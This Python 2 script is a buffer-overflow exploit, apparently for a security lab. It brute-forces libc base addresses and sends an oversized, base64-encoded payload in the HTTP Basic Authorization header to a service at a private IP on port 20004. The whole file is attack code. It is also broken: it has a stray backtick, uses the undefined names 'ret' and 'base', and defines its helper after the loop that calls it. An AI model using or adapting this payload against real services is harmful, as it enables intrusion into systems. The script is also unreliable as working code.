import binascii, socket, time, string, base64, string,struct
#charList = string.ascii_letters + string.digits
bases = range(0xb7500000, 0xb76ff000, 0x1000)
for guess in xrange(len(bases)):
	####################################
`	read = p(guess + 0xD20)
	printF = p(guess + 0x41E4)
	####################################
	s = socket.socket()
	s.connect(("192.168.72.134",20004))
	request = ""
	method = "get "
	path = "/"
	protocol = " HTTP/1.0\r\n"
	request += method + path + protocol
	request += "Authorization: Basic "
	command = "" 
	password =  base64.b64encode("7vK3qG6p1i5LNOVm") 
	password += base64.b64encode((ret *(2030/4)) + "a"*( 2030%4) + struct.pack("<I",0xec4f5d00) + "ABCDEFGHIGKLMNOPQRSTUV123456" + struct.pack("<I",0xdeadbeef) )
	password +=   "\r\n"
	request += password
	s.sendall(request +"\r\n")
	s.recv(1024)
	s.recv(1024)
	print ("Guessing: " + hex(base))
	s.close()

def p(addr):
    return struct.pack("<I", addr)
